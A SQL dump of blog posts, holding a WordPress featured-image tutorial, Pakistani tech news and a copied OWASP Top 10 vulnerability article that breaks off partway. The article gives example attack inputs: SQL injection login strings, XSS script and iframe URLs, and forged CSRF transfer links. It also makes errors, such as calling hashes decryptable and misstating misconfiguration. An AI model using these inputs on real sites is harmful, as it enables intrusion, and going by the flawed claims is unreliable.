(19, 'How to Add Featured Images or Post Thumbnails in WordPress', 'how-to-add-featured-images-or-post-thumbnails-in-wordpress', 'habib123', '2021-09-23 17:03:42', '<p>Featured images also known as post thumbnails are a well-known WordPress feature supported by most themes.</p>\n\n<p>They are the primary image for your blog posts, and they often appear next to the heading on your home page and social media. All&nbsp;<a href=\"https://www.wpbeginner.com/showcase/best-wordpress-themes/\">popular WordPress themes</a>&nbsp;come with built-in support for featured images.</p>\n\n<p>In this article, we&rsquo;ll show you how to easily add featured images or post thumbnails in WordPress.</p>\n\n<p>Beginners Guide to Featured Images in WordPress</p>\n\n<p>Featured images are a WordPress theme feature. Almost all WordPress themes come with built-in support for featured images and display them beautifully across different areas of your&nbsp;<a href=\"https://www.wpbeginner.com/guides/\">WordPress website</a>.</p>\n\n<p><img alt=\"Featured images preview on a typical WordPress blog\" src=\"https://www.wpbeginner.com/wp-content/uploads/2020/04/featuredimages-preview.jpg\" style=\"height:341px; width:550px\" /></p>\n\n<p>As humans, we find visual elements more engaging than plain text. Featured images help you make your blog pages look more appealing.</p>\n\n<p>They also help you build user engagement and increase page views. Search engines and social media websites may also use these images and display them in search results and social media news feed.</p>\n\n<p>Mostly featured images are used for blog posts, but you can also set featured images for pages and custom post types.</p>\n\n<p><strong>Note:</strong>&nbsp;Featured images are not the same as cover image. See the&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/cover-image-vs-featured-image-in-wordpress/\">difference between cover image vs featured image</a>&nbsp;in WordPress.</p>\n\n<p>That being said, let&rsquo;s take a look a how to easily add featured images in WordPress.</p>\n\n<p>Video Tutorial</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>Subscribe to WPBeginner</p>\n\n<p>&nbsp;</p>\n\n<p>If you&rsquo;d prefer written instructions, just keep reading.</p>\n\n<p>Adding Post Thumbnail or Featured Image in WordPress</p>\n\n<p>To add a featured image in a WordPress post, simply edit or create a new blog post.</p>\n\n<p>In the&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/14-tips-for-mastering-the-wordpress-visual-editor/\">content editor</a>, you&rsquo;ll find the featured image tab in the right column.</p>\n\n<p><img alt=\"Featured image section on post edit screen\" src=\"https://www.wpbeginner.com/wp-content/uploads/2020/04/featuredimagebox.jpg\" style=\"height:354px; width:550px\" /></p>\n\n<p>You need to click on the &lsquo;Set Featured Image&rsquo; area, and this will bring up the WordPress media uploader popup.</p>\n\n<p>From here, you can upload an image from your computer or use an existing image from your media library. Once you select the image, simply click on the Set Featured Image button.</p>\n\n<p><img alt=\"Setting a featured image\" src=\"https://www.wpbeginner.com/wp-content/uploads/2020/04/setfeaturedimage.jpg\" style=\"height:328px; width:550px\" /></p>\n\n<p>WordPress will now show a preview of the featured image in the right column. However, the actual featured image would look different depending on your WordPress theme.</p>\n\n<p>You can now save or publish your post and preview it to see how the featured image will appear on your live website.</p>\n\n<p>Depending on settings defined by your theme developer, your featured image will automatically appear with your posts.</p>\n\n<p>How to Find and Effectively Use Featured Images?</p>\n\n<p>Now, the next big question that most beginners come across is where to find images to use as featured images?</p>\n\n<p>You cannot just use Google image search and use any image from the internet. Those images are protected by copyright laws and using them without proper permission can cause legal trouble.</p>\n\n<p>Luckily, there are several resources available that you can use to&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/how-to-find-royalty-free-images-for-your-wordpress-blog-posts/\">find free images</a>&nbsp;for your blog posts.</p>\n\n<p>Our top favorites are:</p>\n\n<p><img alt=\"Unsplash is a popular free image resource for bloggers\" src=\"https://www.wpbeginner.com/wp-content/uploads/2020/04/unsplash.jpg\" style=\"height:344px; width:550px\" /></p>\n\n<p><strong>Note</strong>: All these sources provide high-resolution images, which means they are large in filesize and dimensions. You&rsquo;ll need to&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/speed-wordpress-save-images-optimized-web/\">optimize images for the web</a>&nbsp;before using them as featured images.</p>\n\n<p>Featured images are handled by your WordPress theme. In order to change how your theme displays featured images, you&rsquo;ll need some basic CSS or WordPress coding skills.</p>\n\n<p>If you are comfortable with coding, then continue reading for more tips.</p>\n\n<p>Theme Developers Guide to Featured Image and Post Thumbnails in WordPress</p>\n\n<p>The featured image is a popular feature supported by almost all WordPress themes. In rare situations, you may come across a theme that does not support featured images, or you may not like how they handle feature images.</p>\n\n<p>In that case, you can add featured image support to your theme or change how it appears.</p>\n\n<p>If you are comfortable editing WordPress theme files and know your way around a little custom CSS, then you can do it yourself.</p>\n\n<p>If your theme does not support featured images, then you&rsquo;ll not see the option to add a featured image in the content editor.</p>\n\n<p>To add featured image support in a WordPress theme, you need to add this line of code in your theme&rsquo;s&nbsp;<a href=\"https://www.wpbeginner.com/glossary/functions-php/\">functions.php</a>&nbsp;file:</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n	<tbody>\n		<tr>\n			<td>\n			<p>1</p>\n			</td>\n			<td>\n			<p><code>add_theme_support( </code><code>&#39;post-thumbnails&#39;</code> <code>);</code></p>\n			</td>\n		</tr>\n	</tbody>\n</table>\n\n<p>This code will enable featured image support for posts and pages. You can now go to posts or page&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/how-to-use-the-new-wordpress-block-editor/\">block editor</a>, and you will see the featured image option enabled.</p>\n\n<p>However, when you set a featured image, it will not automatically display in your WordPress theme. To display featured images in your theme, you need to edit your templates and add this line of code where you want to display the featured image:</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n	<tbody>\n		<tr>\n			<td>\n			<p>1</p>\n			</td>\n			<td>\n			<p><code>&lt;?php the_post_thumbnail(); ?&gt;</code></p>\n			</td>\n		</tr>\n	</tbody>\n</table>\n\n<p>The files you add the above code in will vary based on your theme. You will want to add the code inside your post loop.</p>\n\n<p><strong>Related:</strong>&nbsp;See&nbsp;<a href=\"https://www.wpbeginner.com/wp-themes/wordpress-template-hierarchy-explained/\">WordPress theme hierarchy cheat sheet</a>&nbsp;to better understand how themes work.</p>\n\n<p>The above code is the basic function that you need to add featured image support and display featured images in your theme. To set image size for featured images you upload, you need to add this line of code to your&nbsp;<code>functions.php</code>&nbsp;file.</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n	<tbody>\n		<tr>\n			<td>\n			<p>1</p>\n			</td>\n			<td>\n			<p><code>set_post_thumbnail_size( 50, 50);</code></p>\n			</td>\n		</tr>\n	</tbody>\n</table>\n\n<p>The parameters for set_post_thumbnail_size are in this order: width, height.</p>\n\n<p>You can also set additional image sizes to use with the_post_thumbnail() function. For example:</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n	<tbody>\n		<tr>\n			<td>\n			<p>1</p>\n\n			<p>2</p>\n			</td>\n			<td>\n			<p><code>// Image size for single posts</code></p>\n\n			<p><code>add_image_size( </code><code>&#39;single-post-thumbnail&#39;</code><code>, 590, 180 );</code></p>\n			</td>\n		</tr>\n	</tbody>\n</table>\n\n<p>In this example we have added a new image size called&nbsp;<strong>single-post-thumbnail</strong>&nbsp;with 590px with and 180px height.</p>\n\n<p>To use this image size in our theme, we will still need to add it to the appropriate theme file.</p>\n\n<p>Checkout our guide on adding&nbsp;<a href=\"https://www.wpbeginner.com/wp-tutorials/how-to-create-additional-image-sizes-in-wordpress/\" target=\"_blank\">additional image sizes</a>&nbsp;in WordPress for more details.</p>\n\n<p>If you have previously uploaded featured images, but they are still appearing in some other size, then you need to&nbsp;<a href=\"https://www.wpbeginner.com/plugins/regenerate-thumbnails-new-image-sizes-wordpress/\" target=\"_blank\">regenerate thumbnails and image sizes</a>&nbsp;for older posts.</p>\n\n<p>Below is an example of the featured image function with specific image size.</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n	<tbody>\n		<tr>\n			<td>\n			<p>1</p>\n			</td>\n			<td>\n			<p><code>&lt;?php the_post_thumbnail( </code><code>&#39;single-post-thumbnail&#39;</code> <code>); ?&gt;</code></p>\n			</td>\n		</tr>\n	</tbody>\n</table>\n\n<p>This is the broken-down version of the full functionality. There are many other things you can do with featured images.</p>\n\n<p>FAQs About Featured Images in WordPress</p>\n\n<p>As a beginner, you may come across questions or issues when using featured images on your blog. Following are just some of the most frequently asked questions about featured images.</p>\n\n<p><strong>1. Why featured image is appearing twice on my posts?</strong></p>\n\n<p>Sometimes beginner add a featured image and then add the same image inside the content part of the post editor.</p>\n\n<p>All you have to do is remove the image from the content area and only use featured image metabox to add featured image. For more on this topic, see our article on&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/how-to-fix-featured-images-appearing-twice-in-wordpress-posts/\">how to fix featured image appearing twice in WordPress</a>.</p>\n\n<p><strong>2. What is the difference between the cover image and featured image?</strong></p>\n\n<p>Cover images are used in the content area of your posts or pages. They are normally used to separate different sections of a lengthy page or post.</p>\n\n<p>Featured image is the representative image of an article. It does appear before or alongside the content but not inside the actual article.</p>\n\n<p>For more on this topic, see our guide on the&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/cover-image-vs-featured-image-in-wordpress/\">difference between cover image and featured image in WordPress</a>.</p>\n\n<p><strong>3. How to display featured images next to recent blog posts?</strong></p>\n\n<p>The WordPress block editor comes with a &lsquo;Latest Posts&rsquo; block which allows you to display recent posts with post thumbnails.</p>\n\n<p>You can also display recent posts with thumbnails in sidebar widgets using&nbsp;<a href=\"https://wordpress.org/plugins/recent-posts-widget-extended/\" target=\"_blank\">Recent Posts Widget Extended</a>&nbsp;plugin. For more details, see our article on&nbsp;<a href=\"https://www.wpbeginner.com/wp-tutorials/how-to-display-recent-posts-in-wordpress/\">how to display recent posts in WordPress</a>.</p>\n\n<p><strong>4. How to remind authors to add featured image in WordPress?</strong></p>\n\n<p>Featured images are prominently displayed on your homepage, blog page, and other archive pages.</p>\n\n<p>If you or another author on your blog forgot to set one and published the post then it will appear without a featured image. This will look bad and inconsistent, which is not good for user experience.</p>\n\n<p>You can install and activate the&nbsp;<a href=\"http://wordpress.org/plugins/require-featured-image/\" target=\"_blank\">Require Featured Image</a>&nbsp;plugin, which will show a notification when anyone tries to publish a post without featured image.</p>\n\n<p><img alt=\"Require featured image\" src=\"https://www.wpbeginner.com/wp-content/uploads/2020/04/requirefeaturedimage-1.png\" style=\"height:314px; width:550px\" /></p>\n\n<p>For more details, see our article on&nbsp;<a href=\"https://www.wpbeginner.com/plugins/require-featured-images-posts-wordpress/\">how to require featured images in WordPress</a>.</p>\n\n<p>We hope that this article helped you learn how to add featured images or post thumbnails in WordPress. You may also want to check out our&nbsp;<a href=\"https://www.wpbeginner.com/beginners-guide/image-seo-optimize-images-for-search-engines/\">beginner&rsquo;s guide to image SEO</a>&nbsp;which shows how to optimize your WordPress images for search engines.</p>\n\n<ul>\n	<li><a href=\"https://www.wpbeginner.com/refer/shutterstock/\" target=\"_blank\">Shutterstock</a>&nbsp;&ndash; They have a few free images, but the real value comes from their paid plans which give you access to tons of high quality photos, illustrations, drawings, videos, and more. This is what we use for WPBeginner site.</li>\n	<li><a href=\"https://unsplash.com/\" target=\"_blank\">Unsplash</a>&nbsp;&ndash; A popular online resource publishing high-resolution images that you can use on your website and other projects.</li>\n	<li><a href=\"https://negativespace.co/\" target=\"_blank\">Negative Space</a>&nbsp;&ndash; A well-organized collection of copyright-free images.</li>\n	<li><a href=\"https://nos.twnsnd.co/\" target=\"_blank\">New Old Stock</a>&nbsp;&ndash; A collection of vintage photographs from public archives.</li>\n</ul>', '1633183071.png', 9, 'Published'),
(27, 'Oppo aims to export nearly 5 million mobile phones from Pakistan every year', 'oppo-aims-to-export-nearly-5-million-mobile-phones-from-pakistan-every-year', 'admin', '2021-10-02 16:44:40', '<p>In recent news, Oppo has announced that the company plans to export around 5 million mobile phones every year. This would be achieved by upgrading the assembly plant in Pakistan to a manufacturing plant.</p>\n\n<p>This announcement was made by the CEO of Oppo Pakistan, George Long, during his meeting with Federal Minister for Industries and Production, Makhdum Khusro Bakhtyar at his office.</p>\n\n<p>Moreover, George Long also shared the respective plans of establishing a research and development center for the transfer of technology and skill development of IT professionals in Pakistan.</p>\n\n<p>In addition, the Federal Minister stated that the local manufacturing of smartphones would inevitably reduce the prices of mobile phones for the consumers and hence expanding the smartphone industry in Pakistan.</p>\n\n<p>This would also result in more job opportunities in the industry and for other respective industries.</p>', '1633175080.jpeg', 0, 'Published'),
(28, 'IT Minister launches portal for online registration of freelancers', 'it-minister-launches-portal-for-online-registration-of-freelancers', 'admin', '2021-10-02 16:46:23', '<p>Federal Minister for IT and Telecommunication Syed Aminul Haque inaugurated a portal for online registration of freelancers at the Pakistan Software Export Board (PSEB) head office.&nbsp;</p>\n\n<p><a href=\"https://www.brecorder.com/news/40120733/minister-inaugurates-portal-for-online-registration-of-freelancers\" target=\"_blank\">As reported by&nbsp;<em>Business Recorder</em></a>, the launching of the portal &ndash; which can be accessed&nbsp;<a href=\"https://pseb.org.pk/app/index.php\" target=\"_blank\">here</a>&nbsp;&ndash; for registration of freelancers is among the many steps undertaken by the government to ensure the growth of the freelance community in Pakistan.&nbsp;</p>\n\n<p>Secretary IT Dr Sohail Rajput was also present on the occasion.&nbsp;</p>\n\n<p>Speaking on the occasion, Haq said that Pakistani freelancers had fueled the growth of the gig economy in Pakistan. With Pakistan&rsquo;s freelancer industry growing rapidly, registration of freelancers is a major step forward in providing due recognition to the contribution being made by Pakistani freelancers.&nbsp;&nbsp;</p>\n\n<p>Naturally, the growth of Pakistani freelancers would enhance the country&rsquo;s export earnings.&nbsp;</p>\n\n<p>The federal minister for IT also talked about the National Freelancing Facilitation Policy, which has been developed after significant consultation and is focused on accelerating and sustaining the development of the freelancer industry in Pakistan.&nbsp;</p>\n\n<p>Osman Nasir, managing director PSEB, said that Pakistan is ranked as the second largest supplier of Online Labour in Software Development and Technology as per the findings of the&nbsp;<a href=\"https://www.ilo.org/global/research/global-reports/weso/2021/WCMS_771749/lang--en/index.htm\" target=\"_blank\">International Labour Organization Flagship Report 2021</a>.&nbsp;&nbsp;</p>\n\n<p>The future growth of Pakistan&rsquo;s freelancer industry directly depends on the availability of IT professionals trained in state-of-the-art technologies.&nbsp;</p>\n\n<p>The fact that Pakistani freelancers are witnessing exponential growth cannot be ignored. Earlier this year, the nation&rsquo;s freelancing community brought in $150 million in revenue, featuring exports to over 120 countries.&nbsp;</p>', '1633175183.jpg', 0, 'Published'),
(29, 'Pakistani sellers are over the moon for Amazon listing but FBR could be knocking at their door', 'pakistani-sellers-are-over-the-moon-for-amazon-listing-but-fbr-could-be-knocking-at-their-door', 'habib123', '2021-10-02 16:47:45', '<p>You can be a king or a street sweeper, but everyone dances with the&nbsp;<strong>Grim Reaper!&nbsp;</strong>He doesn&rsquo;t disappear&hellip;he catches up. And he could be readying its Scythe for a Blyth about to enter its territory.</p>\n\n<p>Last week,&nbsp;<a href=\"https://www.techjuice.pk/pakistani-sellers-can-now-create-amazon-accounts/\">Pakistan officially joined the Amazon list of global sellers</a>&nbsp;due to the efforts of the&nbsp;<em>&nbsp;<a href=\"https://www.commerce.gov.pk/ecommerce-policy-2019/\" target=\"_blank\">National E-Commerce Council (NeCC)</a>&nbsp;</em>at large and a coordinated national effort, resulting in widespread optimism &ndash; a huge milestone that can boost cross-border e-commerce exports. Regardless, what truly made the Pakistani small and medium-sized sellers jump out of their seats was the prospect of selling directly on the largest E-commerce platform in the world and connecting with global customers. However, there is an &ldquo;elephant in the room&rdquo; &ndash; the potential E-commerce taxation by the Federal Board of Revenue (FBR) on the newly onboarded Pakistani sellers.</p>\n\n<h2>Seller&rsquo;s Taxation Concerns</h2>\n\n<p>Budding Pakistani sellers are already concerned about the taxes they will have to pay owing to a lack of an E-commerce regulatory framework and the ongoing situation of FBR&rsquo;s tax notices sent to IT exporters, including freelancers. Salman Ahmed, who operates a mobile phone accessories business on the outskirts of Saddar, said,&nbsp;<em>&ldquo;I was hoping to make it big by selling on Amazon after the announcement, but the recent statements by the IT minister regarding the FBR&rsquo;s tax notices are worrying. I mean, if they can tax the IT industry, what&rsquo;s to stop them from doing the same to E-commerce?&rdquo;</em></p>\n\n<h2>Fears of similar taxation as the IT industry</h2>\n\n<p>The IT Minister&nbsp;<a href=\"https://www.techjuice.pk/it-minister-strongly-objects/\">strongly objected</a>&nbsp;to FBR&rsquo;s tax notices recently, which hadn&rsquo;t stopped despite&nbsp;<a href=\"https://www.techjuice.pk/20-days-later-it-minister-expresses-deep-concern-over-fbrs-crackdown-on-the-freelancers-and-online-businesses/\">earlier interventions</a>&nbsp;by the minister.</p>', '1633175265.jpg', 0, 'Published');
INSERT INTO `posts` (`id`, `title`, `slug`, `author`, `date`, `content`, `thumbnail`, `view_count`, `status`) VALUES
(30, '10 Most Common Web Security Vulnerabilities', '10-most-common-web-security-vulnerabilities', 'akram123', '2021-10-02 16:51:02', '<p>OWASP or Open Web Security Project is a non-profit charitable organization focused on improving the security of software and web applications.</p>\n\n<p>The organization publishes a list of top web security vulnerabilities based on the data from various security organizations.</p>\n\n<p>The web security vulnerabilities are prioritized depending on exploitability, detectability and impact on software.</p>\n\n<ul>\n	<li><strong>Exploitability &ndash;</strong>\n\n	<p>What is needed to exploit the security vulnerability? Highest exploitability when the attack needs only web browser and lowest being advanced programming and tools.</p>\n	</li>\n	<li><strong>Detectability &ndash;</strong>\n	<p>How easy is it to detect the threat? Highest being the information displayed on URL, Form or Error message and lowest being source code.</p>\n	</li>\n	<li><strong>Impact or Damage &ndash;</strong>\n	<p>How much damage will be done if the security vulnerability is exposed or attacked? Highest being complete system crash and lowest being nothing at all.</p>\n	</li>\n</ul>\n\n<p>The main aim of OWASP Top 10 is to educate the developers, designers, managers, architects and organizations about the most important security vulnerabilities.</p>\n\n<p><strong>The Top 10 security vulnerabilities as per OWASP Top 10 are:</strong></p>\n\n<ul>\n	<li><a href=\"https://www.guru99.com/web-security-vulnerabilities.html#1\">SQL Injection</a></li>\n	<li><a href=\"https://www.guru99.com/web-security-vulnerabilities.html#2\">Cross Site Scripting</a></li>\n	<li><a href=\"https://www.guru99.com/web-security-vulnerabilities.html#3\">Broken Authentication and Session Management</a></li>\n	<li><a href=\"https://www.guru99.com/web-security-vulnerabilities.html#4\">Insecure Direct Object References</a></li>\n	<li><a href=\"https://www.guru99.com/web-security-vulnerabilities.html#5\">Cross Site Request Forgery</a></li>\n	<li><a href=\"https://www.guru99.com/web-security-vulnerabilities.html#6\">Security Misconfiguration</a></li>\n	<li><a href=\"https://www.guru99.com/web-security-vulnerabilities.html#7\">Insecure Cryptographic Storage</a></li>\n	<li><a href=\"https://www.guru99.com/web-security-vulnerabilities.html#8\">Failure to restrict URL Access</a></li>\n	<li><a href=\"https://www.guru99.com/web-security-vulnerabilities.html#9\">Insufficient Transport Layer Protection</a></li>\n	<li><a href=\"https://www.guru99.com/web-security-vulnerabilities.html#10\">Unvalidated Redirects and Forwards</a></li>\n</ul>\n\n<h2>SQL Injection</h2>\n\n<p><img alt=\"10 Most Common Web Security Vulnerabilities\" src=\"https://cdn.guru99.com/images/cassandra/021216_0701_10MostCommo1.jpg\" style=\"height:433px; width:500px\" /></p>\n\n<p><strong>Description</strong></p>\n\n<p>Injection is a security vulnerability that allows an attacker to alter backend<a href=\"https://www.guru99.com/sql.html\" onclick=\"ga(\'send\', \'event\', \'internal_linking\', \'10 Most Common Web Security Vulnerabilities\', \'10 Most Common Web Security Vulnerabilities\');\">&nbsp;SQL&nbsp;</a>statements by manipulating the user supplied data.</p>\n\n<p>Injection occurs when the user input is sent to an interpreter as part of command or query and trick the interpreter into executing unintended commands and gives access to unauthorized data.</p>\n\n<p>The SQL command which when executed by web application can also expose the back-end database.</p>\n\n<p><strong>Implication</strong></p>\n\n<ul>\n	<li>An attacker can inject malicious content into the vulnerable fields.</li>\n	<li>Sensitive data like User Names, Passwords, etc. can be read from the database.</li>\n	<li>Database data can be modified (Insert/Update/ Delete).</li>\n	<li>Administration Operations can be executed on the database</li>\n</ul>\n\n<p><strong>Vulnerable Objects</strong></p>\n\n<ul>\n	<li>Input Fields</li>\n	<li>URLs interacting with the database.</li>\n</ul>\n\n<p><strong>Examples:</strong></p>\n\n<ul>\n	<li>SQL injection on the Login Page</li>\n</ul>\n\n<p>Logging into an application without having valid credentials.</p>\n\n<p>Valid userName is available, and password is not available.</p>\n\n<p>Test URL:&nbsp;<strong>http://demo.testfire.net/default.aspx</strong></p>\n\n<p>User Name: sjones</p>\n\n<p>Password: 1=1&prime; or pass123</p>\n\n<p>SQL query created and sent to Interpreter as below</p>\n\n<p>SELECT * FROM Users WHERE User_Name = sjones AND Password = 1=1&prime; or pass123;</p>\n\n<p><strong>Recommendations</strong></p>\n\n<ol>\n	<li>White listing the input fields</li>\n	<li>Avoid displaying detailed error messages that are useful to an attacker.</li>\n</ol>\n\n<h2>Cross Site Scripting</h2>\n\n<p><strong>Description</strong></p>\n\n<p>Cross Site Scripting is also shortly known as XSS.</p>\n\n<p>XSS vulnerabilities target scripts embedded in a page that are executed on the client side i.e. user browser rather then at the server side. These flaws can occur when the application takes untrusted data and send it to the web browser without proper validation.</p>\n\n<p>Attackers can use XSS to execute malicious scripts on the users in this case victim browsers. Since the browser cannot know if the script is trusty or not, the script will be executed, and the attacker can hijack session cookies, deface websites, or redirect the user to an unwanted and malicious websites.</p>\n\n<p>XSS is an attack which allows the attacker to execute the scripts on the victim&rsquo;s browser.</p>\n\n<p><strong>Implication:</strong></p>\n\n<ul>\n	<li>Making the use of this security vulnerability, an attacker can inject scripts into the application, can steal session cookies, deface websites, and can run malware on the victim&rsquo;s machines.</li>\n</ul>\n\n<p><strong>Vulnerable Objects</strong></p>\n\n<ul>\n	<li>Input Fields</li>\n	<li>URLs</li>\n</ul>\n\n<p><strong>Examples</strong></p>\n\n<p>1.&nbsp;<strong>http://www.vulnerablesite.com/home?&rdquo;&lt;script&gt;alert(&ldquo;xss&rdquo;)&lt;/script</strong>&gt;</p>\n\n<p>The above script when run on a browser, a message box will be displayed if the site is vulnerable to XSS.</p>\n\n<p>The more serious attack can be done if the attacker wants to display or store session cookie.</p>\n\n<p>2.&nbsp;<strong>http://demo.testfire.net/search.aspx?txtSearch &lt;iframe</strong>&gt; &lt;src =&nbsp;<strong>http://google.com</strong>&nbsp;width = 500 height 500&gt;&lt;/iframe&gt;</p>\n\n<p>The above script when run, the browser will load an invisible frame pointing to&nbsp;<strong>http://google.com</strong>.</p>\n\n<p>The attack can be made serious by running a malicious script on the browser.</p>\n\n<p><strong>Recommendations</strong></p>\n\n<ol>\n	<li>White Listing input fields</li>\n	<li>Input Output encoding</li>\n</ol>\n\n<h2>Broken Authentication and Session Management</h2>\n\n<p><strong>Description</strong></p>\n\n<p>The websites usually create a session cookie and session ID for each valid session, and these cookies contain sensitive data like username, password, etc. When the session is ended either by logout or browser closed abruptly, these cookies should be invalidated i.e. for each session there should be a new cookie.</p>\n\n<p>If the cookies are not invalidated, the sensitive data will exist in the system. For example, a user using a public computer (Cyber Cafe), the cookies of the vulnerable site sits on the system and exposed to an attacker. An attacker uses the same public computer after some time, the sensitive data is compromised.</p>\n\n<p>In the same manner, a user using a public computer, instead of logging off, he closes the browser abruptly. An attacker uses the same system, when browses the same vulnerable site, the previous session of the victim will be opened. The attacker can do whatever he wants to do from stealing profile information, credit card information, etc.</p>\n\n<p>A check should be done to find the strength of the authentication and session management. Keys, session tokens, cookies should be implemented properly without compromising passwords.</p>\n\n<p><strong>Vulnerable Objects</strong></p>\n\n<ul>\n	<li>Session IDs exposed on URL can lead to session fixation attack.</li>\n	<li>Session IDs same before and after logout and login.</li>\n	<li>Session Timeouts are not implemented correctly.</li>\n	<li>Application is assigning same session ID for each new session.</li>\n	<li>Authenticated parts of the application are protected using SSL and passwords are stored in hashed or encrypted format.</li>\n	<li>The session can be reused by a low privileged user.</li>\n</ul>\n\n<p><strong>Implication</strong></p>\n\n<ul>\n	<li>Making use of this vulnerability, an attacker can hijack a session, gain unauthorized access to the system which allows disclosure and modification of unauthorized information.</li>\n	<li>The sessions can be high jacked using stolen cookies or sessions using XSS.</li>\n</ul>\n\n<p><strong>Examples</strong></p>\n\n<ol>\n	<li>Airline reservation application supports URL rewriting, putting session IDs in the URL:\n	<p><strong>http://Examples.com/sale/saleitems;jsessionid=2P0OC2oJM0DPXSNQPLME34SERTBG/dest=Maldives</strong>&nbsp;(Sale of tickets to Maldives)</p>\n\n	<p>An authenticated user of the site wants to let his friends know about the sale and sends an email across. The friends receive the session ID and can be used to do unauthorized modifications or misuse the saved credit card details.</p>\n	</li>\n	<li>An application is vulnerable to XSS, by which an attacker can access the session ID and can be used to hijack the session.</li>\n	<li>Applications timeouts are not set properly. The user uses a public computer and closes the browser instead of logging off and walks away. The attacker uses the same browser some time later, and the session is authenticated.</li>\n</ol>\n\n<p><strong>Recommendations</strong></p>\n\n<ol>\n	<li>All the authentication and session management requirements should be defined as per OWASP Application Security Verification Standard.</li>\n	<li>Never expose any credentials in URLs or Logs.</li>\n	<li>Strong efforts should be also made to avoid XSS flaws which can be used to steal session IDs.</li>\n</ol>\n\n<h2>Insecure Direct Object References</h2>\n\n<p><strong>Description</strong></p>\n\n<p>It occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, or database key as in URL or as a FORM parameter. The attacker can use this information to access other objects and can create a future attack to access the unauthorized data.</p>\n\n<p><strong>Implication</strong></p>\n\n<ul>\n	<li>Using this vulnerability, an attacker can gain access to unauthorized internal objects, can modify data or compromise the application.</li>\n</ul>\n\n<p><strong>Vulnerable Objects</strong></p>\n\n<ul>\n	<li>In the URL.</li>\n</ul>\n\n<p><strong>Examples:</strong></p>\n\n<p>Changing &ldquo;userid&rdquo; in the following URL can make an attacker to view other user&rsquo;s information.</p>\n\n<p><strong>http://www.vulnerablesite.com/userid=123</strong>&nbsp;Modified to&nbsp;<strong>http://www.vulnerablesite.com/userid=124</strong></p>\n\n<p>An attacker can view others information by changing user id value.</p>\n\n<p><strong>Recommendations:</strong></p>\n\n<ol>\n	<li>Implement access control checks.</li>\n	<li>Avoid exposing object references in URLs.</li>\n	<li>Verify authorization to all reference objects.</li>\n</ol>\n\n<h2>Cross Site Request Forgery</h2>\n\n<p><strong>Description</strong></p>\n\n<p>Cross Site Request Forgery is a forged request came from the cross site.</p>\n\n<p>CSRF attack is an attack that occurs when a malicious website, email, or program causes a user&rsquo;s browser to perform an unwanted action on a trusted site for which the user is currently authenticated.</p>\n\n<p>A CSRF attack forces a logged-on victim&rsquo;s browser to send a forged HTTP request, including the victim&rsquo;s session cookie and any other automatically included authentication information, to a vulnerable web application.</p>\n\n<p>A link will be sent by the attacker to the victim when the user clicks on the URL when logged into the original website, the data will be stolen from the website.</p>\n\n<p><strong>Implication</strong></p>\n\n<ul>\n	<li>Using this vulnerability as an attacker can change user profile information, change status, create a new user on admin behalf, etc.</li>\n</ul>\n\n<p><strong>Vulnerable Objects</strong></p>\n\n<ul>\n	<li>User Profile page</li>\n	<li>User account forms</li>\n	<li>Business transaction page</li>\n</ul>\n\n<p><strong>Examples</strong></p>\n\n<p>The victim is logged into a bank website using valid credentials. He receives mail from an attacker saying &ldquo;Please click here to donate $1 to cause.&rdquo;</p>\n\n<p>When the victim clicks on it, a valid request will be created to donate $1 to a particular account.</p>\n\n<p><strong>http://www.vulnerablebank.com/transfer.do?account=cause&amp;amount=1</strong></p>\n\n<p>The attacker captures this request and creates below request and embeds in a button saying &ldquo;I Support Cause.&rdquo;</p>\n\n<p><strong>http://www.vulnerablebank.com/transfer.do?account=Attacker&amp;amount=1000</strong></p>\n\n<p>Since the session is authenticated and the request is coming through the bank website, the server would transfer $1000 dollars to the attacker.</p>\n\n<p><strong>Recommendation</strong></p>\n\n<ol>\n	<li>Mandate user&rsquo;s presence while performing sensitive actions.</li>\n	<li>Implement mechanisms like CAPTCHA, Re-Authentication, and Unique Request Tokens.</li>\n</ol>\n\n<h2>Security Misconfiguration</h2>\n\n<p><strong>Description</strong></p>\n\n<p>Security Configuration must be defined and deployed for the application, frameworks, application server, web server, database server, and platform. If these are properly configured, an attacker can have unauthorized access to sensitive data or functionality.</p>\n\n<p>Sometimes such flaws result in complete system compromise. Keeping the software up to date is also good security.</p>\n\n<p><strong>Implication</strong></p>\n\n<ul>\n	<li>Making use of this vulnerability, the attacker can enumerate the underlying technology and application server version information, database information and gain information about the application to mount few more attacks.</li>\n</ul>\n\n<p><strong>Vulnerable objects</strong></p>\n\n<ul>\n	<li>URL</li>\n	<li>Form Fields</li>\n	<li>Input fields</li>\n</ul>\n\n<p><strong>Examples</strong></p>\n\n<ol>\n	<li>The application server admin console is automatically installed and not removed. Default accounts are not changed. The attacker can log in with default passwords and can gain unauthorized access.</li>\n	<li>Directory Listing is not disabled on your server. Attacker discovers and can simply list directories to find any file.</li>\n</ol>\n\n<p><strong>Recommendations</strong></p>\n\n<ol>\n	<li>A strong application architecture that provides good separation and security between the components.</li>\n	<li>Change default usernames and passwords.</li>\n	<li>Disable directory listings and implement access control checks.</li>\n</ol>\n\n<h2>Insecure Cryptographic Storage</h2>\n\n<p><strong>Description</strong></p>\n\n<p>Insecure Cryptographic storage is a common vulnerability which exists when the sensitive data is not stored securely.</p>\n\n<p>The user credentials, profile information, health details, credit card information, etc. come under sensitive data information on a website.</p>\n\n<p>This data will be stored on the application database. When this data are stored improperly by not using encryption or hashing*, it will be vulnerable to the attackers.</p>\n\n<p>(*Hashing is transformation of the string characters into shorter strings of fixed length or a key. To decrypt the string, the algorithm used to form the key should be available)</p>\n\n<p><strong>Implication</strong></p>\n\n<ul>\n	<li>By using this vulnerability, an attacker can steal, modify such weakly protected data to conduct identity theft, credit card fraud or other crimes.</li>\n</ul>\n\n<p><strong>Vulnerable objects</strong></p>\n\n<ul>\n	<li>Application 